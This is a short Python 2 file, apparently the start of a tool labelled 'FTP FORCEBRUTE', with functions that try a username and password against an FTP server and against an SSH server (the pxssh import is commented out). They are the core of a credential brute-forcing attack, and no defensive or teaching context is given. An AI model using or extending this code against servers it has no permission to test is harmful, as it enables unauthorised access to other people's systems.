### 	FTP FORCEBRUTE 	###
### 	OSIRIS 			###
import ftplib, sys#, pxssh


def ftpbreaker(addr, user, passwd):
	try:
		con = ftplib.FTP(addr)
		con.login(user, passwd)
		con.close()
		return 1

	except Exception, error:
		return 0

	except KeyboardInterrupt:
		sys.exit()
def sshBreaker(addr, user, passwd):
	try:
		conn = pxssh.pxssh()
		conn.login(addr,user,passwd)
		return conn
	except:
		print "[!] Couldn't connect to the server"